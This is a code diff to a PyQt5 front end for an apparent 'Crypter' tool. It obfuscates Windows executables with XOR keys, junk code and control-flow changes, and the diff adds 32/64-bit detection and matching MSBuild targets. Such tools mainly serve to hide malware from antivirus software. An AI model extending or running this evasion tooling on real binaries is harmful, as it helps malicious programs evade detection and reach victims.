@@ -37,6 +37,7 @@ from PyQt5.QtGui import QPixmap
 from obfuscation import obfuscate
 from metadata import change_metadata
 import os, shutil, glob
+import pefile
 
 class Ui_mainWindow(object):
     def __init__(self) :
@@ -141,6 +142,7 @@ class Ui_mainWindow(object):
         self.checkBox_3.setText(_translate("mainWindow", "Control flow"))
     
     def generate(self) :
+        is_64bit = False
         in_filename = self.filepath
         out_filename = "../bin/" + self.pushButton.text().split(".")[0] + "_out.exe"
         xor_key = ''
@@ -155,6 +157,19 @@ class Ui_mainWindow(object):
             QCoreApplication.processEvents()
             return
     
+        try :
+            pe = pefile.PE(in_filename)
+        except :
+            self.label_2.setText("File is not a binary.")
+            QCoreApplication.processEvents()
+            return
+        if hex(pe.FILE_HEADER.Machine) == '0x14c':
+            self.label_2.setText("File is a 32-bit binary")
+        else:
+            self.label_2.setText("File is a 64-bit binary")
+            is_64bit = True
+        QCoreApplication.processEvents()
+
         self.label_2.setText("Creating sample header...")
         QCoreApplication.processEvents()
         
@@ -184,7 +199,7 @@ class Ui_mainWindow(object):
         
         self.label_2.setText("Adding junk code...")
         QCoreApplication.processEvents()
-        obfuscate(self.spinBox.value(), self.spinBox_2.value(), self.cflow, self.junk)
+        obfuscate(self.spinBox.value(), self.spinBox_2.value(), self.cflow, self.junk, is_64bit)
         self.label_2.setText("done.")
         QCoreApplication.processEvents()
         
@@ -201,7 +216,11 @@ class Ui_mainWindow(object):
         vs_path = os.popen("\"%ProgramFiles(x86)%/Microsoft Visual Studio/Installer/vswhere.exe\" -nologo -latest -property installationPath").read().replace("\n","") #https://stackoverflow.com/questions/46223916/msbuild-exe-not-found-cmd-exe
         cmd_line = vs_path + "\\Msbuild\\Current\\Bin\\MSBuild.exe"
         
-        return_code = os.system("\""+cmd_line+"\" ../Crypter /p:Configuration=Release;Platform=x86;OutDir=.;DebugSymbols=false;DebugType=None;Zm=5000;TargetExt=.exe;TargetName="+out_filename.replace(".exe", "")+"  /t:Rebuild")
+        if is_64bit :
+            return_code = os.system("\""+cmd_line+"\" ../Crypter /p:Configuration=Release;Platform=x64;OutDir=.;DebugSymbols=false;DebugType=None;Zm=5000;TargetExt=.exe;TargetName="+out_filename.replace(".exe", "")+"  /t:Rebuild")
+        else :
+            return_code = os.system("\""+cmd_line+"\" ../Crypter /p:Configuration=Release;Platform=x86;OutDir=.;DebugSymbols=false;DebugType=None;Zm=5000;TargetExt=.exe;TargetName="+out_filename.replace(".exe", "")+"  /t:Rebuild")
+
         
         if return_code :
             self.label_2.setText("build failed.")
